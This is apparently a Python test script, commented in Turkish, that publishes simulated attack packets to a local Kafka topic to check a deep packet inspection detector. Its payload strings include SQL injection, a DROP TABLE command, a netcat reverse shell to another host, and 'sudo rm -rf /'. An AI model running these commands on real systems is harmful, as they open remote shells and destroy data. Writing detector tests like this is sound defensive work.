from confluent_kafka import Producer
import json
import time

# Kafka Yapılandırması
conf = {'bootstrap.servers': 'localhost:9092'}
producer = Producer(conf)

def send_malicious_packet(reason, payload_content):
    data = {
        "src": "192.168.1.100",
        "dst": "10.0.0.5",
        "proto": 6,  # TCP
        "len": 500,
        "payload": payload_content,
        "timestamp": time.time()
    }
    
    print(f"Sending {reason} attack: {payload_content}")
    producer.produce('raw-traffic', value=json.dumps(data).encode('utf-8'))
    producer.flush()

# --- TEST SENARYOLARI ---

print("--- DPI Testi Başlatılıyor ---\n")

# 1. Senaryo: SQL Injection
send_malicious_packet("SQL Injection", "SELECT * FROM users WHERE id = 1 OR 1=1")
time.sleep(2)

# 2. Senaryo: Tehlikeli Veritabanı Komutu
send_malicious_packet("Database Destruction", "DROP TABLE orders; --")
time.sleep(2)

# 3. Senaryo: Remote Code Execution (Reverse Shell)
send_malicious_packet("Remote Shell", "nc -e /bin/sh 192.168.1.50 4444")
time.sleep(2)

# 4. Senaryo: Linux Sistem Erişimi
send_malicious_packet("Bash Execution", "sudo rm -rf / && /bin/bash")
time.sleep(2)

print("\n--- Test Tamamlandı. Dashboard'u Kontrol Et! ---")